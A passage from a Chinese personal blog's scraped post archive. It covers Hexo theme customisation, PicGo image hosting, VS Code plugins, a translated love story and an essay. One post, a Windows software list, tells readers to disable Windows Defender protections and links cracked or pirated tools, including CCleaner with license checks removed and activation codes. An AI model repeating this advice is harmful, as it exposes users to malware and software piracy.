spellcheck=&quot;true&quot;&gt;//只在桌面版网页启用特效&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; windowWidth &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;window&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;windowWidth &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;768&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;&amp;lt;script type=&quot;text/javascript&quot; src=&quot;/js/sakura.js&quot;&gt;&amp;lt;\\/script&gt;&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; ## [](#添加鼠标彩虹星星掉落跟随效果 &quot;添加鼠标彩虹星星掉落跟随效果&quot;)添加鼠标彩虹星星掉落跟随效果 在`themes/matery/source/js`目录下新建`cursor.js`文件，打开这个网址[传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fbaifeng66%2Fcdn%401.1%2Fsource%2Fjs%2Fcursor.js)，将内容复制粘贴到cursor.js即可。 然后再`themes/matery/layout/layout.ejs`文件内添加下面的内容： &lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/js/cursor.js&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; ## [](#添加雪花飘落效果 &quot;添加雪花飘落效果&quot;)添加雪花飘落效果 在`themes/matery/source/js`目录下新建`snow.js`文件，打开这个网址[传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fbaifeng66%2Fcdn%401.1%2Fsource%2Fjs%2Fsnow.js)，将内容复制粘贴到cursor.js即可。 然后再`themes/matery/layout/layout.ejs`文件内添加下面的内容： &lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/js/snow.js&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; ## [](#文章生成永久链接 &quot;文章生成永久链接&quot;)文章生成永久链接 主题默认的文章链接配置是 &lt;pre class=&quot;line-numbers language-yaml&quot;&gt;`&lt;span class=&quot;token key atrule&quot;&gt;permalink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;year/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;month/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;day/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;title&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; 这种生成的链接地址很长，文章版权的链接地址会出现一大串字符编码，一点也不好看。因此需要修改文章生成链接的格式。 **注：设置之后之前的文章评论就没了** 首先再根目录下执行下面的命令： &lt;pre class=&quot;line-numbers language-bash&quot;&gt;`&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; hexo-abbrlink --save&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; 然后再站点配置文件下添加如下配置： &lt;pre class=&quot;line-numbers language-yaml&quot;&gt;`&lt;span class=&quot;token key atrule&quot;&gt;abbrlink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;alg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; crc16 &lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;#算法： crc16(default) and crc32&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;rep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; hex &lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;#进制： dec(default) and hex: dec #输出进制：十进制和十六进制，默认为10进制。丨dec为十进制，hex为十六进制&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; 再将站点配置文件的`permalink`的值修改为： &lt;pre class=&quot;line-numbers language-yaml&quot;&gt;`&lt;span class=&quot;token key atrule&quot;&gt;permalink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; posts/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;abbrlink.html &lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;# 此处可以自己设置，也可以直接使用 :/abbrlink&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; 生成完后，原md文件的Front-matter 内会增加`abbrlink` 字段，值为生成的ID 。这个字段确保了在我们修改了`Front-matter` 内的博客标题title或创建日期date字段之后而不会改变链接地址。 ## [](#添加Live2d看板娘 &quot;添加Live2d看板娘&quot;)添加Live2d看板娘 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814211201.png) 插件：hexo-helper-live2d github仓库：[https://github.com/EYHN/hexo-helper-live2d](https://github.com/EYHN/hexo-helper-live2d)** ### [](#1-安装插件 &quot;1.安装插件&quot;)1.安装插件 运行命令`npm install --save hexo-helper-live2d` ### [](#2-选择模型 &quot;2.选择模型&quot;)2.选择模型 **可到 [https://huaji8.top/post/live2d-plugin-2.0/](https://huaji8.top/post/live2d-plugin-2.0/) 预览效果。** **命令为:`npm install live2d-widget-model-模型名`，模型为可参考上面的预览内容。** ### [](#3-配置 &quot;3.配置&quot;)3.配置 站点更目录的配置文件`_config.yml`或者是主题的配置文件中添加： &lt;pre&gt;`# Live2D ## https://github.com/EYHN/hexo-helper-live2d live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-tororo # 模型：https://huaji8.top/post/live2d-plugin-2.0/ display: position: left width: 150 height: 350 mobile: show: true admin: deployCommand: &#39;hexo-pubish.bat&#39;`&lt;/pre&gt; **_注意这里的use参数是上面安装的那个模型全名_** ### [](#取消看板娘 &quot;取消看板娘&quot;)取消看板娘 将配置中的`enable`设置成`false`即可。 ### [](#卸载插件 &quot;卸载插件&quot;)卸载插件 运行命令下载插件，删除配置信息： 1.卸载模型：npm uninstall live2d-widget-model-模型名 2.卸载live2d插件：npm uninstall hexo-helper-live2d 3.去掉站点_config.yml下的配置信息即可。 ## [](#添加实时发布说说页面（Artitalk） &quot;添加实时发布说说页面（Artitalk）&quot;)添加实时发布说说页面（Artitalk） 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814212059.png) 教程： ## [](#自定义不使用主题模板渲染的独立页面 &quot;自定义不使用主题模板渲染的独立页面&quot;)自定义不使用主题模板渲染的独立页面 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814212511.png) 用途：加入一些不用主题的页面，如404页面，新建一个导航页，具有自己独立的样式，可以放一些自己的作品，相册什么的，以下就介绍这种独立页面的实现方法。 使用 Hexo 提供的跳过渲染配置，在博客根目录的配置文件 `_config.yml` 里找到 `skip_render` 关键字，在后面添加想要跳过渲染的页面，比如我们创建 `\\source\\about\\index.html`， 配置文件填写：`skip_render: about\\**`，那么就表示 `\\source\\about` 里所有的文件将跳过渲染，里面的文件将会被直接复制到 public 文件夹，此时就会得到一个独立的 about 页面；官方文档：[https://hexo.io/docs/configuration](https://hexo.io/docs/configuration) 如： &lt;pre&gt;`# 屏蔽渲染 skip_render: - &quot;404.md&quot; - &quot;Nobaidu/**&quot; 这里面对404.html页面屏蔽渲染，对Nobaidu文件夹下的html文件屏蔽渲染 参考文章： hexo-theme-matery 【Hexo】Hexo 主题 Matery 配置 Hexo+yilia添加Live2d看板娘"},{"title":"个人博客搭建（5）：网页页尾鱼塘效果美化","path":"/post/f393.html","text":""},{"title":"Win好软推荐","path":"/post/3a62.html","text":"这期推荐一些个人在电脑使用中用到的提高工作（游戏）效率的好软件 前排提醒：所有软件资源均来自网络。 关闭Win自带definderwindows 10中自带杀毒软件Windows Defender，但是对于下面分向的大多是第三方软件，自带的杀毒软件往往会删掉软件，使用者或者不喜欢安装杀毒软件的用户怎么关闭它成为了难题，这篇文章会告诉你如何临时关闭windows defender或者永久关闭它。 1.选择“开始”按钮 ，然后选择“设置” &gt;“更新和安全” &gt;“Windows 安全中心”。打开了Windows Defender操作界面，依次打开“病毒和威胁防护”-“病毒和威胁防护设置” 2.在“病毒和威胁防护”设置界面，关闭“实时保护”，关闭“云提供的保护”，关闭“自动提交样本”这三项。 如果按钮是灰色无法修改，那么可能你的第三方软件已通过其他方式为您已经关闭了。 之后可以安装火绒等管家替代definder管理电脑。 解压工具解压工具是用来解压压缩包， 压力太大不适合用这个，建议去捏方便面 Winrar[WinRAR]是一款强大的压缩文件管理器，它提供了RAR和ZIP文件的完整支持，能解压ARJ、CAB、LZH、ACE、TAR、GZ、UUE、BZ2、JAR、ISO格式文件。 下面的大部分软件会用Zip压缩包的形式分享，所以下载下挺方便的 下载链接： https://wws.lanzous.com/iYmNvfjqeqf 使用自带解压工具解压教程： https://jingyan.baidu.com/article/a378c960d0cb10b328283002.html 下载解压后会得到一下文件 双击打开EXE后缀文件即可运行 之后解压压缩包会自动使用此软件 去广告弹窗广告火绒去除电脑弹窗广告首选 火绒 呀！ 下载链接 点击下载安装，免费版在弹窗拦截方面已经很厉害了， 打开方式： 对于没有自动识别的弹窗也可以使用截图拦截功能，在弹窗出现的时候，使用此功能选择弹窗，对其拦截！ 之后就再也不担心突然弹出令人尴尬的广告了。 浏览器广告这里推荐浏览器使用 电脑自带的 Microsoft Edge或者 谷歌浏览器（Chrome），火狐浏览器（Firefox） 这三款浏览器比较简约，其余360 UC浏览器之类的都是用的他们的浏览器内核，是对这几个浏览器的包装，而且这三款浏览器可以安装一款神器—游猴插件 游猴里面的好多插件可以使电脑拥有好多功能，例如破解付费vip视屏，去广告，这部分在后面再提。 这里给大家推荐的软件是 ADGUARD作为号称是世界上最高级的广告拦截程序！Adguard Premium 是摆脱恼人广告，在线跟踪，保护您远离恶意软件的最佳方式。AdGuard 使您网络冲浪更快速，更安全，更安逸！ AdGuard for Windows PC版 不只是一款广告拦截软件，它还组合了可获取最佳网络体验所需功能的多用途工具。其可拦截广告和危险网站，加速网页载入，保护儿童的在线安全。轻松阻挡 (比“隐藏过滤”更高效更彻底) 广告、减少页面加载时间、富媒体或其他非标准类型的广告，在对网页垃圾信息进行屏蔽后可加快页面载入速度。同时 Adguard 还支持反钓鱼并对反恶意软件以及网站进行过滤。 官方网站 购买价格： 网络下载链接 使用教程： 下载后解压在一固定目录下,此软件是免安装版，所以删除后就不能用了哦。 解压打开后会有如下文件 双击打开AdguardPortable.exe 启用保护 打开设置 安装浏览器助手就可以在浏览器里除掉广告了 打开浏览器就可以在右上角看到这个图标 电脑管家提到电脑管家，可能大家首先想到360电脑管家或者腾讯的，但在使用中大家会发现当下载360电脑管家之后过几天你就拥有了360浏览器，360解压等等360全家桶，这种捆绑式很让人头疼，甚至于卸载都卸载不干净。这里给大家推荐两款专业的软件。 wisecare 365官网 网络资源 https://wws.lanzous.com/iLVDRfjjjqd 激活教程 解压之后会得到如下文件 注册信息txt里面提供了一些激活码 当现实未激活时，可以用这些激活码激活 软件提供了很多功能 其中 计划任务可以定时清理电脑垃圾 Ccleaner官网：https://www.ccleaner.com/ccleaner CCleaner pro 是由英国 Piriform 工作室开发的最著名，且广受好评的系统清理优化及隐私保护软件，也是该工作室的主打和首发产品，支持自定义清理规则，增强了应用程序清理范围和效果。可以有效清除各种系统垃圾文件及应用程序垃圾，同时具备系统优化功能，可以对临时文件夹、历史记录、注册表冗余条目等进行垃圾清理，附带启动项管理、软件卸载功能。不含任何间谍软件和垃圾程序。支持包括简体中文在内的31国语言界面! CCleaner pro 是一款免费的系统优化和隐私保护工具。主要用来清除Windows系统不再使用的垃圾文件，以腾出更多硬盘空间。它的另一大功能是清除使用者的上网记录。 感谢th_sjy大神的修改和分享，特点如下： 去除了无用文件、语言文件夹，去除了版本检测、自动更新，去除了许可证验证，集成了许可证文件无需注册运行即为专业版。不再卡顿、不再提示新版本更新、许可证永久有效。 此破解版绿色原生便携，配置信息不写注册表！ 技术员增强版和专业增强版相比，技术员增强版清理功能更多，而且多了很多自定义选项。 Professional 为专业版、Business 为商业版、Technician 为技术员版。 网络资源 浏览器这部分前面也提到了 推荐浏览器使用 电脑自带的 Microsoft Edge或者 谷歌浏览器（Chrome），火狐浏览器（Firefox） 谷歌浏览器（Chrome）下载：https://www.google.cn/chrome/index.html 浏览器除了前面提到的游猴以外，还可以安装很多扩展程序，下载扩展程序可以到chrome网上应用店 打开方法： chrome网上应用店网址：https://chrome.google.com/webstore/category/extensions?hl=zh-CN 下面给大家推荐一些扩展程序： 1.AdGuard浏览器助手Beta 1.0.13计划这个就是前面ADGUARD的插件 2.哔哩哔哩助手: bilibili.com 综合辅助扩展1.2.21下载：哔哩哔哩助手 点击添加到Chrome即可 功能： 点击浏览器右上角图标即可设置 3.Momentum 1.17. 41下载：Momentum 1.17. 41 功能： 大家新标签页时显示更美观的标签页 音乐下载全网付费音乐免费下载软件，前排提醒，低调使用 MusicTools下载地址 搜索后可免费下载 软件设置里设置下载目录，下载的歌曲会存在目录下 护眼软件FluxPortable 4.118 f.lux是款功能简单实用的电脑护眼神器，这款软件非常的小巧，是您眼睛的健康专家，使您的眼睛受到的辐射减少，软件主要的功能就是为了帮助用户快速的调节您的电脑显示屏的亮度，而且换是根据室内的光线来进行快速的调节，使您的眼睛一直处于舒服的状态等，当然我还是推荐Iris护眼神器，大家可以在网站搜索获取这个软件 网络资源：https://wws.lanzous.com/iVus0fjlcxa 解压后会得到如下文件 双击打开FluxPortable.exe PDF文件浏览器PDFelement一款功能强大的pdf阅读器，解锁多种功能，方便电脑打开教材文件学习 网络资源：https://cloud.189.cn/t/iAnmQ3jI7nyu 免安装版本，下载之后打开exe文件即可 工具集utools强烈安利！！集成了好多工具，方便使用 uTools是一个极简、插件化、跨平台的现代化桌面软件。通过自由选配丰富的插件，打造你得心应手的工具集合。 通过快捷键（默认alt+space）就可以快速呼出这个搜索框。它相当聪明，可以支持输入、拖拽、自动粘贴等作为输入源，相应的插件也早已准备就绪，统一的设计风格和操作方式，助你高效的得到结果。 当你熟悉它后，能够为你节约大量时间，让你可以更加专注地改变世界。 官网：https://u.tools/ 使用方法： 使用快捷键 ALT + 空格键快速打开，在输入框里输入小工具名 如“剪贴板” ，按enter打开 点击右边图标可以打开主面板，可以安装插件工具 本地文件搜索软件everthing下载链接：https://www.voidtools.com/zh-cn/ 当我们要找某一个文件却忘记放到哪儿的时候，一般会使用自带的搜索工具（当然上个Utools也有搜索的功能，可以选择那个） 但这个方法搜索速度非常慢 Everthing搜索： 明显速度快了好多。 哔哩哔哩哔哩uwp是第三方开发者开发的哔哩哔哩玩的uwp应用，界面个人感觉很清新，功能也相对完整，之前一般都是在浏览器上看，现在用上这个uwp感觉还可以 下载：https://wws.lanzous.com/i5QcXeehm7e 使用： 下载后会得到以下文件 打开 60520B029E250.4264454043325_1.3.8.0_x64__5aa7k9th7aafp.appx 就可以开始安装 设置里面可以切换模式，提供了两种模式"},{"title":"个人博客搭建（3）:Typora+PicGo+Github/Gitee搭建免费稳定的图床","path":"/post/8bd5.html","text":"PicGo一个用于快速上传图片并获取图片URL链接的工具 PicGo官网：PicGo下载：仓库地址按照官方安装方法安装 注：在安装的时候安装目录千万不能选C:\\Program Files\\下的任何地方，因为PicGo无法解析这一路径，如果你不知道安装在哪里的话，选择仅为我安装，否则在设置Typora时会出现错误： Github仓库图床新建Public Github仓库创建Repository点击”New repository”按钮，仓库名字随意 新生成一个Personal access tokens生成一个Token用于操作GitHub repositorySettings --&amp;gt; Developer Settings --&amp;gt; Personal access tokens ![Personal access tokens&#96;](https://cdn.jsdelivr.net/gh/wkif/ImageHosting/kif_img&#x2F;20200721123456.png) 生成Token 会生成如上图的一串token，这串token之后不会再显示，所以第一次看到的时候，可以建个文本文件保存，忘记了只有重新生成，每次都不一样。 PicGo配置配置Github图床填写说明 仓库名：按照“账户名&#x2F;仓库名的格式填写”，比如我的是wkif&#x2F;ImageHosting 分支名：填写masterTOKEN：Token粘贴在这里路径：可留空，如需自己填写记得末尾加上&#x2F;设定自定义域名：自定义域名的作用是在上传图片后成功后，PicGo会将“自定义域名+上传的图片名”生成的访问链接，放到剪切板上，这里我用到了jsdeliver 的免费CDN加速，自定义域名需要按照这样去填写：https://cdn.jsdelivr.net/账户名/仓库名/master，比如我的是：https://cdn.jsdelivr.net/gh/wkif/ImageHosting Typora配置PicGo下载Typora下载地址 配置 验证设置是否正确 错误解决错误1： failed to launch PicGo app: Command failed: C:\\Program Files\\PicGo\\PicGo.exe &#39;C:\\Program&#39; �����ڲ����ⲿ���Ҳ���ǿ����еĳ��� ���������ļ��� 前面提到的安装的问题，不要放在c盘下 错误2： &#96; Failed to fetch &#96; way: gitee的后续在写吧！"},{"title":"shmily","path":"/post/984a.html","text":"shmilySometimes some little things can teach us a lot. My grandparents were married for over half a century, and played their own special game from the time they had met each other. The goal of their game was to write the word”shmily”in a surprise place for the other to find. They took turns leaving”shmily”around the house, and as soon as one of them discovered it, it was their turn to hide it once more. They dragged”shmily”with their fingers through the sugar and flour containers to await whoever was preparing the next meal. They smeared it in the dew on the windows overlooking the patio where my grandma always fed us warm, homemade pudding with blue food coloring.”Shmily”was written in the steam left on the mirror after a hot shower, where it would reappear bath after bath. At one point, mygrandmothereven unrolled an entire roll of toilet paper to leave”shmily”on the very last sheet. There was no end to the places”shmily”would pop up. Little notes with”shmily”scribbled hurriedly were found on dashboards and car seats, or taped to steering wheels. The notes were stuffed inside shoes and left under pillows.”Shmily”was written in the dust upon the mantel and traced in the ashes of thefireplace. Thismysteriousword was as much a part of my grandparents’house as the furniture. It took me a long time before I was able to fullyappreciatemy grand-parents’game.Skepticismhas kept me from believing in true love-one that is pure and enduring. However, I never doubted my grandparents’relationship. They had love down pat.It was more than their flirtatious little games; it was a way of life. Their relationship was based on a devotion andpassionateaffectionwhich not everyone is lucky to experience. Grandma and Grandpa hold hands every chance they could. They stole kisses as they bumped into each other in their tiny kitchen. They finished each other’s sentences and shared the dailycrosswordpuzzle and word jumble.. My grandma whispered to me about how cute my grandpa was, how handsome and old he had grown to be. She claimed that she really knew”how to pick’em.”Before every meal they bowed their heads and gave thanks, marveling at theirblessings: a wonderful family, good fortune, and each other. But there was a dark cloud in my grandparents’life: my grandmother had breast cancer. The disease had first appeared ten years earlier. As always, Grandpa was with her every step of the way. He comforted her in their yellow room, painted that way so that she could always be surrounded by sunshine, even when she was too sick to go outside. Now the cancer was again attacking her body. With the help of a cane and my grandfather’s steady hand, they went to church every morning. But my grandmother grew steadily weaker until, finally, she could not leave the house anymore. For a while, Grandpa would go to church alone, praying to God to watch over his wife. Then one day, what we all dreaded finally happened. Grandma was gone.”Shmily.”It was scrawled in yellow on the pink ribbons of my grandmother’s funeral bouquet. As the crowd thinned and the last mourners turned to leave, my aunts, uncles, cousins and other family members came forward and gathered around Grandma one last time. Grandpa stepped up to my grandmother’s casket and, taking a shaky breath and then he began to sing to her. Through his tears , the song came, deep and slow. Thank you，grandpa and grandma，for letting me see. S-h-m-i-l-y: See How Much I Love You. By Laura Jeanne Allen 知道我有多爱你我的祖父和祖母结婚已逾半个世纪，然而多少年来，他们彼此间不倦地玩着一个特殊的游戏：在一个意想不到的地方写下“Shmily”这个词留待对方来发现。他们轮换着在屋前房后留下“Shmily”，一经对方发现，就开始新的一轮。 他们用手指在糖罐和面箱里写下“Shmily”，等着准备下一餐饭的对方来发现；他们在覆着霜花的玻璃上写下“Shmily”；一次又一次的热水澡后，总可以看见雾气蒙罩的镜子上留下的“Shmily”。 有时，祖母甚至会重卷一整卷卫生纸，只为了在最后一片纸上写下“Shmily”。 没有“Shmily”不可能出现的地方。仓促间涂写的“Shmily”会出现在汽车坐垫上，或是一张贴在方向盘轴心的小纸条上。这一类的字条会被塞进鞋子里或是压在枕下。 “Shmily”会被书写在壁炉台面的薄尘上，或是勾画在炉内的灰底上。这个神秘的词，像祖父母的家具一样成了他们房间的一部分。 直到很久以后，我才能完全理解祖父母之间游戏的意义。年轻时我不懂得爱——那种纯洁且历久弥坚的爱。然而，我从未怀疑过祖父母之间的感情。他们彼此深爱。他们的小游戏已远非调情消遣，那是一种生活方式。他们之间的感情是基于一种深挚的爱和献身精神，不是每一个人都能体验到的。 祖父和祖母一有机会就彼此执手相握。他们在小厨房里错身而过时偷吻；他们说完彼此的半截句子；他们一起玩拼字和字谜游戏。祖母常忘情地对我耳语祖父有多可爱迷人，依然还是那么帅气。她骄傲地宣称自己的确懂得“如何选择”。每次餐前他们垂首祈祷时，感谢他们受到的诸多福佑：一个幸福的家庭、好运道和拥有彼此。 可是一片乌去遮蔽了祖父母的家：祖母的癌恶化了。首次发现是在10年前。跟以往一样，祖父总是跟祖母肩并肩地走过人生艰难之旅的每一步。为了安慰祖母，祖父将他们的卧房喷涂成黄色，这样在祖母病重不能出屋时，亦能感到周围的阳光。 起先，在祖父坚实的手臂和拐杖的帮扶下，他们每天清晨一起去教堂散步和默祷。但随着祖母日见虚弱，终于，祖父只能独自去教堂，祈求上帝看顾他的妻子。 然而那一天，我们担心忧惧的事终于还是发生了，祖母去世了。 “Shmily”写在祖母葬礼上花束的黄色缎带上。当人群散去，叔伯、姑姑和其他的家庭成员又走上前来最后一次围聚在祖母身旁。祖父步向祖母的灵柩，用颤抖的声音轻轻的唱起“知道我有多么爱你……”透过悲伤的泪，这歌声低沉轻柔地飘入耳来……我终于明白了他们特殊小游戏的意义“S— h— m— I— l— y”：“See how much I love you（知道我多么爱你）”。 因悲伤而颤栗着，我永远无法忘记那一刻.谢谢你们，祖父祖母，是你们让我懂得了什么是爱 。来自：https://baike.baidu.com/item/shmily/130197"},{"title":"vs code 开发微信小程序","path":"/post/f738.html","text":"这里推荐大家使用号称“宇宙第一IDE”的编辑器——vscode。安装方法看博客上一篇文章，主要介绍一下几个vscode插件，在vscode中搜索插件关键字点击安装即可。 小程序助手让vscode 提供对 .wxss .wxml 文件后缀的支持 minapp支持微信小程序标签、属性的智能补全，并且提示中包含文档内容（同时支持原生小程序、mpvue 和 wepy 框架，并提供 snippets）。 wechat-snippet这个插件主要的功能就是代码辅助，代码片段自动完成，可以作为上个插件的补充。 wxml这款插件用于将wxml代码进行高亮显示，并且提供代码格式化的功能，可将代码格式化为较易阅读的样式。 vscode wxml提供微信小程序代码的提示对wxml文件进行格式化 wechat-snippet 有了上面这几款插件，便可以开始高效地撸代码了。至于代码的调试以及效果的查看，当然还是得打开微信开发者工具。将编辑器隐藏，调试工具调到最大，快速找到元素的位置，修改样式，Ctrl+S，提交代码，一顿操作猛如虎。 下面这是我的界面，可以把微信开发程序仅打开模拟器，放在右边，左边用vscode写好代码后，鼠标点击到 右边，ctrl+r刷新就可以看到效果了。"},{"title":"个人博客搭建（2）:配置gitalk评论","path":"/post/7a4f.html","text":""},{"title":"总会有人陪你奇奇怪怪","path":"/post/d474.html","text":"讲起爱情，其实爱情刚开始都是你情我愿，是共喝一杯奶茶都觉得很甜，是说不完的话，也是聊不完的天。 渐渐地，就算是特意为对方准备了惊喜，也从对方眼睛里明显看到没有了期待。我们开始怀疑，难道爱情里的耐心也有保质期。 时间一到，联系变成负担，关心变成干扰，就连一举一动，都透着我在等着你回报的意味。 也许都市人繁忙的生活，简短的爱情就像电影《他其实没那么喜欢你》说的那样： 有手机、有快速拨号、甚至有语音拨号，有时压根没想打电话，电话就从裤兜里拨出去了，为什么没有时间打电话。 如果真的喜欢你就不会忘记，如果忘记说明他不在乎你失望。 “忙”就是恋爱上的大规模杀伤性武器，是“混蛋”的同义词，混蛋就是用忙敷衍你的那个人。 或许我们可以活在聊天记录营造的美好里，活在他还爱我只是他太忙了的想象里，但是这个仅由自己一己之力撑起来的美梦，一戳就破。 就像以前看失恋三十三天的时候，记得《失恋33天》里面有一句台词我很喜欢： 感谢命运让我们这样结束，不用对我觉得抱歉，我不稀罕你的抱歉，我不稀罕你说的亏欠，我要的就是这样对等的关系。 一段感情里，在起点时我们彼此相爱，到结尾时，互为仇敌，你不仁我不义。我要你知道，我们始终势均力敌。 成年人的感情，进退都应该把握分寸。 如果余生你不主动找我，我这辈子都不会再与你有交集。 但只要你与我说话，我看见了一定秒回，或者你说想见我，就算是刀山火海也要以最快的速度出现在你的面前。 所以，承认吧，我们要的并不是聊天记录维持的爱情。 承认我们都做到了爱对方这件事，却终究没能做好陪对方一起走下去的准备。 就像如今的网恋可以讲是当下流行的一种社交吧。无论是青春懵懂的学生，还是已经踏足社会的成年人，都会接触到网恋一词。 喜怒哀乐都只能透过手机传达，我感觉欠缺一种爱情里的实在，有时候挂住对方如果透过手机来表达总比见一面欠点真情流露。网恋我支持但思念还是要靠见面。被惦记是幸福的所以想念就要去见对方。 就像前些日子，在网上看到一个特别温馨的小故事： 楼道有一则广告，广告词写着“太阳能维修”，下面有人用笔接了一句：“月亮可更换”。 路过的女生觉得这句话可爱，便把它分享给了喜欢的男孩，没想到男孩很快回复她：“星星不闪包退换”。 那一刻，我好像忽然明白了一个道理：人这一辈子，遇到爱遇到性都不稀罕，稀罕的是遇到了解。 就好像比起穿得漂不漂亮，他更在意你穿得舒不舒服；比起一昧追问你的情绪低落缘由，他会轻轻牵起你的手，虽然我不知道怎么回事，但我想先带你去吃饭，我会陪着你。 毕竟每个灵魂与生俱来都是孤独的，可总会遇到另一个能与之发生共鸣的灵魂，然后在尘世间相互慰藉。 这时候，你就会觉得，人间真的好值得。还记得在最近看的一档综艺节目里，重新解锁了当年偶像吴尊的另一面。 现实生活里，他幼稚又爱碎碎念，就连他的妻子林丽莹都吐槽说，你可以娘，但不要那么啰嗦。 后来这句话成为吴尊好友们调侃他的金句，他也不生气，还借此来打趣逗乐林丽莹。 生活平淡，其实真的没有那么多惊天动地的惊喜轮番上演，更多的时候，是对方为你做的一点点努力，堆积起来，换取命运手里的巧克力，带给你甜蜜和欢愉。 人这一辈子，会说很多很多的话，也会做很多很多的事，能遇到一个对你事事有回应，件件有着落的人，却不容易。 这样的人，他懂你的奇奇怪怪，也愿意陪你可可爱爱，愿你我都能遇到这样的人。 